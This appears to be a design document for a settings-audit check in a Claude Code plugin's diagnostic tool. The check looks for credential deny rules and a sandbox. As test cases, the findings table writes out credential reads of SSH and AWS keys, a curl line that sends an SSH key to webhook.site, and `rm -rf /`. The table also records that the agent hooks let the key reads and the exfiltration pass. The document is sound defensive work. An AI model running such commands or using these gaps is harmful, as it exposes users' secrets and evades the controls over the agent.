# Check 16: Operator Settings Posture

**Severity: warn.** Every finding here is a *recommendation* to write something into
a scope Claude Code actually reads. Doctor never edits a settings file; it prints the
exact JSON and the operator pastes it. A session runs fine with all of these missing.
It just runs with less protection than the old docs implied.

## The constraint, stated once so nobody re-adds these to the plugin

A plugin's bundled `settings.json` is **not a settings scope**. `plugins-reference.md`
line 858, verbatim:

> Default configuration applied when the plugin is enabled. Only the `agent` and
> `subagentStatusLine` keys are currently supported.

`settings.md:15-24` enumerates the scopes CC merges: **Managed / User / Project /
Local**. A plugin bundle is not among them. So `permissions`, `sandbox`, `env`,
`fileSuggestion`, `plansDirectory` and friends are **inert** inside a plugin no
matter how correct their values are. That is why this check exists: the controls
below can only be real in the *operator's* own settings, and the only honest thing
ork can do is detect their absence and hand over the JSON.

Two live proofs this was inert rather than merely undocumented, both measured
2026-08-09: ork declared `plansDirectory: ".claude/plans"` and that directory has
never existed in any checkout while the default `~/.claude/plans` does; ork declared
`sandbox.enabled: true` **with `failIfUnavailable: true`**, which would have
hard-failed startup or sandboxed every Bash call, and neither has ever happened.

**Do NOT re-home the whole old block.** Several of its keys were wrong or harmful.
`CLAUDE_CODE_SUBPROCESS_ENV_SCRUB=1` forces permission mode back to `default`,
defeating `--dangerously-skip-permissions`, `--permission-mode`, and agent-frontmatter
`permissionMode`. `CLAUDE_CODE_SESSIONEND_HOOKS_TIMEOUT_MS=8000` would cut ork's own
30s-derived SessionEnd budget. `ORCHESTKIT_LOG_LEVEL=warn` short-circuits `/debug`
escalation. `CLAUDE_CODE_NO_FLICKER=1` fights an explicit `tui: "default"`.
Only the groups below are worth recommending.

## What the check looks for

| # | Finding | Why it matters | Hook coverage at HEAD |
|---|---------|----------------|-----------------------|
| 1 | No credential-read `permissions.deny` rules | `Read(~/.ssh/**)` and friends are the only thing between an agent and a private key | **NONE.** Measured: the `Read` matcher in `hooks.json` carries exactly `pretool/read/tldr-summary` and `lifecycle/webhook-forwarder`, neither of which denies. `cat ~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.netrc`, `~/.npmrc`, `~/.gnupg/secring.gpg` all ABSTAIN through `pretool/bash/sync-bash-dispatcher` while the `rm -rf /` control in the same run DENIES |
| 2 | No `sandbox` block | OS-level Bash isolation plus the exfil-domain denylist | **PARTIAL.** `pretool/bash/network-egress-guard` returns `ask` on the *upload* shape, but a plain `curl -s https://pastebin.com/raw/…`, and even `curl -s https://webhook.site/x?d=$(cat ~/.ssh/id_rsa)`, ABSTAIN. Prompt is not block, and GET-shaped exfil walks straight through |
| 3 | `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS` in no settings file | ork's own `src/hooks/src/lib/agent-teams.ts:28` gates `isAgentTeamsActive()` on `=== '1'`. Without it, team mode degrades silently: no error, no log line | N/A, a hook cannot set its own env |

Findings 4 and 5 are *offers*, not defects. `ENABLE_TOOL_SEARCH` and
`CLAUDE_CODE_PLUGIN_KEEP_MARKETPLACE_ON_FAILURE` are real, useful, and entirely
optional. Report them at info level and never fail on them.

## The check

Read-only. Never prints an environment variable's **value** (presence is tested with
`[ -n "${VAR+x}" ]`), and never writes a settings file.

```bash
U="$HOME/.claude/settings.json";  UL="$HOME/.claude/settings.local.json"
P=".claude/settings.json";        PL=".claude/settings.local.json"

# jq over an OPTIONAL file. The `-f` test is the guard, so neither `2>/dev/null`
# nor `|| true` is needed or wanted.
key() { if [ -f "$1" ]; then jq -r "$2 // empty" "$1"; fi; }

# First non-empty across the four real scopes; local and project win over user.
first() {
  for f in "$PL" "$P" "$UL" "$U"; do
    v="$(key "$f" "$1")"
    if [ -n "$v" ]; then printf '%s' "$v"; return; fi
  done
}

# 1. credential-read deny rules, counted across every scope.
#    awk 'END{print n+0}' rather than `grep -c … || true`: a grep over a
#    possibly-missing file returns non-zero even when it matched, and a
#    trailing `||` on that inverts the verdict.
#    `.permissions.deny // []` BEFORE the `[]`: a file carrying `permissions`
#    with no `deny` key yields null, and `.permissions.deny[]` fails on it with
#    "Cannot iterate over null" and rc=5. Measured against a real
#    ~/.claude/settings.local.json on 2026-08-09. Guarding after the iteration
#    is too late — the alternative never runs.
cred_deny="$(
  for f in "$PL" "$P" "$UL" "$U"; do key "$f" '.permissions.deny // [] | .[]'; done \
  | awk '/\.ssh|\.aws|\.gnupg|\.netrc|\.npmrc/ { n++ } END { print n+0 }'
)"

# 2. sandbox posture. Check 15 reads settings.local.json only; this reads all four.
sandbox="$(first '.sandbox.enabled')"
# `length` must NOT be taken before the null test. `first` stops at the first
# NON-EMPTY answer, and `null | length` is 0 — a non-empty string. So the first
# scope-file that merely EXISTS without a sandbox block (settings.local.json,
# on nearly every machine) shadows the user scope and pins this to 0 forever:
# the finding could never report the healthy state. Verified 2026-08-09 against
# a fixture declaring 2 denied domains, which the pre-fix filter read as 0.
# A DECLARED empty array must still report 0, so only null may map to empty.
denied_domains="$(first '.sandbox.network.deniedDomains | if . == null then empty else length end')"

# 3-5. env keys: settings-declared vs merely live in this shell.
for v in CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS ENABLE_TOOL_SEARCH \
         CLAUDE_CODE_PLUGIN_KEEP_MARKETPLACE_ON_FAILURE; do
  in_settings="no"; if [ -n "$(first ".env.$v")" ]; then in_settings="yes"; fi
  in_env="no";      if [ -n "${!v+x}" ];              then in_env="yes";      fi
  printf '%s settings=%s shell=%s\n' "$v" "$in_settings" "$in_env"
done
```

`settings=no shell=yes` is its own finding, not a pass. The variable survives only as
long as that shell profile does: it is absent from a GUI launch, from any other
machine, and for every other user of the same repo.

## Example output, FAILING (what a typical machine prints today)

Measured on the operator's real machine, 2026-08-09, CC 2.1.226. `~/.claude/settings.json`
carries 20 top-level keys and `permissions.deny` holds 5 entries, all five of them MCP
tool names (`mcp__hq-channels__whatsapp_send_image`, `…_send_audio`, `…_send_document`,
`…_logout_session`, `…_email_send`). Not one is a credential-read rule.

```
+-- Check 16: Operator Settings Posture ----------------------------------+
| ❌ permissions.deny  0 credential-read rules across 4 scopes             |
|    Read(~/.ssh/**) has ZERO hook coverage. Measured, not assumed.        |
| ❌ sandbox          absent from user AND local settings                  |
|    deniedDomains: 0, so GET-shaped exfil is unguarded.                   |
| ⚠️ AGENT_TEAMS      settings=no  shell=yes                               |
|    Live via ~/.zshrc only. Non-portable: team mode is silently degraded  |
|    on every other machine and for every other user of this repo.         |
| ℹ️ TOOL_SEARCH      settings=no  shell=no   (optional tuning)            |
| ℹ️ KEEP_MARKETPLACE settings=no  shell=no   (optional resilience)        |
+-------------------------------------------------------------------------+
| Status: WARN (2 gaps, 1 non-portable, 2 offers)                          |
| Fix: ork:configure skill, section "Operator-Scope Settings", or paste    |
|      the JSON from configure/references/cc-version-settings.md.          |
+-------------------------------------------------------------------------+
```

## Example output, PASSING

```
+-- Check 16: Operator Settings Posture ----------------------------------+
| ✅ permissions.deny  5 credential-read rules (user scope)                |
| ✅ sandbox          enabled, deniedDomains: 18, credentials.files: 5     |
| ✅ AGENT_TEAMS      settings=yes (user scope), portable                  |
| ℹ️ TOOL_SEARCH      settings=yes                                         |
| ℹ️ KEEP_MARKETPLACE settings=no  (optional, declined)                    |
+-------------------------------------------------------------------------+
| Status: PASS                                                             |
+-------------------------------------------------------------------------+
```

## Reporting rules

- Findings 1 and 2 are **warn**. They are genuine missing protection, and the hook
  layer demonstrably does not cover them.
- Finding 3 is **warn** whenever `settings=no`, regardless of `shell`. A shell-only
  value is a machine-local accident, not configuration.
- Findings 4 and 5 are **info**, always. Never fail a run on them.
- Every warn prints the exact JSON to paste and the scope to paste it into. Doctor
  diagnoses AND prescribes; it does not just list.

## Honest limits, STATE THESE IN THE OUTPUT, do not hide them

- **Doctor cannot see managed settings.** An enterprise managed profile may already
  supply all of this and doctor would still report it missing. Say "not visible in
  user/project/local scope", never "not set".
- **`permissions.deny` is a permission-layer control, not containment.** It stops the
  `Read` tool. It does not stop a Bash subprocess from reading the same file. That is
  what the `sandbox` block is for, and it is why finding 2 is not redundant with
  finding 1.
- **`sandbox` is Bash-only.** Read/Write tools, MCP servers, and hooks run unsandboxed
  on the host. See Check 15 for the full caveat list; this check adds the
  `network.deniedDomains` and `credentials.files` dimensions that Check 15 never reads.
- **Check 15 and Check 16 overlap on purpose and can disagree by scope.** Check 15
  reads `settings.local.json` only; Check 16 reads all four. If they disagree, the
  block is set in a scope Check 15 does not look at.
- **No runtime API.** Settings files are the only signal. A session sandboxed via a CLI
  flag with no settings key reads here as "absent".
- **Hook-coverage claims in this file are dated.** They were measured against
  `src/hooks/bin/run-hook.mjs` on 2026-08-09 with `rm -rf /` as a passing control.
  Re-run the probes before citing them: an unregistered hook key returns
  `{"continue":true}` with no decision, which reads exactly like an allow.
